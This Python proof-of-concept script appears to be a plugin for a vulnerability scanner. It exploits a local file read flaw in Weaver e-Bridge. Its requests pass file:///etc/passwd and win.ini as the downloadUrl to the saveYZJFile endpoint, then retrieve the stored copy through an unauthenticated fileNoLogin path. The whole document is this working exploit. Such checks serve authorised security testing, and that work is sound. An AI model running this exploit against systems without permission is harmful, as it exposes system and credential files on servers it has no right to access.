#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import json
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'weaver e-bridge lfl'
        self.keyword = ['ecology8', 'lfl']
        self.info = 'weaver e-bridge lfl'
        self.type = VUL_TYPE.LFI
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, './'):
                    pocs = [
                        "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt",
                        "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt"
                    ]
                    for poc in pocs:
                        url = path + poc
                        async with session.get(url=url) as res:
                            if res != None and res.status == 200:
                                text = await res.text()
                                if 'id' in text and 'filepath' in text and 'name' in text:
                                    file_id = json.loads(text).get('id', '')
                                    if file_id:
                                        url2 = path + 'file/fileNoLogin/' + str(file_id)
                                        async with session.get(url=url2) as res2:
                                            if res2 != None and res2.status == 200:
                                                text2 = await res2.text()
                                                if '[extensions]' in text2 or 'root:x:' in text2:
                                                    self.flag = 1
                                                    self.req.append({"url": url2})
                                                    self.res.append({"info": url, "key": "weaver e-bridge lfl"})
                                                    return